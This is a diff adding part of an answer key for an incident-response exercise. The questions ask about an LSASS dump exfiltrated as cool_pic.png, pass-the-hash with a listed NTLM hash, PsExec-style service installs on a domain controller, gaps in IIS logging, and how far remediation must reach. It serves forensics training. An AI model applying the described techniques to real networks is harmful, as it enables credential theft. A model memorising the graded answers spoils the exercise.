+      Yes. The LSASS memory dump (dumpfile.dmp, ~56 MB) was renamed to
+      cool_pic.png to masquerade as web content, then retrieved via
+      GET /uploads/cool_pic.png returning 200 with a transfer time of
+      125,871 ms. Identifying the dump and the rename is not sufficient —
+      the retrieval is what confirms exfiltration. Consequently EVERY
+      credential cached in LSASS on WEB01 must be treated as compromised,
+      including the WEB01 machine account, not only the eugene account the
+      attacker was subsequently observed using.
+    related_event_ids: [lsass-dump, masquerade-dump, exfil-dump]
+    hint: "Dumping credentials and stealing credentials are two different events. Look for both."
+    points: 4
+
+  - id: q5
+    question: "How did the attacker authenticate to the domain controller, and what makes that authentication anomalous?"
+    answer: >
+      Pass-the-hash using the NTLM hash 847bfb693121775ad21ba7e42d47fd07 for
+      the domain account "eugene", via Invoke-WMIExec and then
+      Invoke-SMBExec. On the DC this appears as an NTLM/NtLmSsp network
+      (type 3) logon originating from WEB01 (10.42.10.90). In a
+      Kerberos-first Active Directory environment, NTLM authentication
+      arriving from a member server is strongly anomalous and is the key
+      DC-side detection signature.
+    related_event_ids: [pth-wmiexec, dc-ntlm-logon]
+    points: 3
+
+  - id: q6
+    question: "What pattern on the domain controller indicates PsExec-style remote execution, and how many such executions occurred?"
+    answer: >
+      Windows event ID 7045 service installations with random 20-character
+      uppercase names, each running %COMSPEC% /C with the attacker's command
+      as the ImagePath, under the LocalSystem account. Six occurred:
+      XFBRJVUPQBBNMSAPIGNN (whoami), JNJGAJKLIAYGOVRWVJEQ (hostname),
+      RPAEIKQUFPUNFNVKJSJA (dir C:\), HSEUYQJPNJXBVTHFYPSY (mkdir C:\temp),
+      XHQRIOBCLHVONYJKUPSS (payload download), BLJDSNRKEJTNPSDQFOQA
+      (payload execution). Legitimate software does not name services this way.
+    related_event_ids: [dc-recon-whoami, dc-recon-hostname, dc-service-dir, dc-service-mkdir, dc-download-payload, dc-execute-payload]
+    points: 3
+
+  - id: q7
+    question: "Two attacker actions on the domain controller have no corresponding entry in the IIS log. Identify them and explain why."
+    answer: >
+      The service installs XFBRJVUPQBBNMSAPIGNN (whoami) at 08:49 and
+      JNJGAJKLIAYGOVRWVJEQ (hostname) at 08:50 appear on DCSRV with no
+      matching web-shell request. The commands were delivered to the shell
+      by HTTP POST, and IIS logs the query string but never the request
+      body. The correct conclusion is that the web log understates the
+      attacker's activity, and the correct recommendation is to enable
+      request-body logging or deploy a WAF so POST-borne commands are
+      captured. Reporting only what the web log shows would under-scope the
+      incident.
+    related_event_ids: [dc-recon-whoami, dc-recon-hostname]
+    hint: "Compare the DC service installs against the web log one for one. Two don't reconcile. Why might that be, given how IIS logging works?"
+    points: 4
+
+  - id: q8
+    question: "What is the correct scope of this compromise, and what remediation does that scope require?"
+    answer: >
+      The attacker achieved SYSTEM-level code execution on a domain
+      controller, so the entire Active Directory domain must be treated as
+      compromised — not merely WEB01 and the eugene account. Required
+      remediation includes a krbtgt double-reset, rotation of all domain
+      credentials (including service and machine accounts), DSRM password
+      reset, a rebuild-versus-remediate decision for DCSRV, and rebuilding
+      WEB01 from known-good media. Resetting only eugene's password would
+      leave the attacker's access intact via the exfiltrated LSASS dump and
+      any persistence established by the unrecovered second-stage script.
+    related_event_ids: [dc-execute-payload, exfil-dump]
+    points: 4
+
+  - id: q9
+    question: "What could you NOT determine from the available evidence, and what would you request?"
+    answer: >
+      The contents and behavior of the second-stage payload (e.ps1) are
+      unknown; the logs end shortly after execution. Also undetermined: what
+      the POST-delivered commands were, whether persistence was established
+      on DCSRV, and whether other hosts were touched. Requests should
+      include PowerShell ScriptBlock/Module logging from DCSRV, the e.ps1
+      file itself or an EDR capture of its execution, IIS request-body or
+      WAF logs, network flow/proxy data for the paste-site connection and
+      the cool_pic.png download, and logs predating 06:00 to establish
+      whether reconnaissance began earlier.
+    related_event_ids: [dc-execute-payload, dc-recon-whoami]
+    points: 3
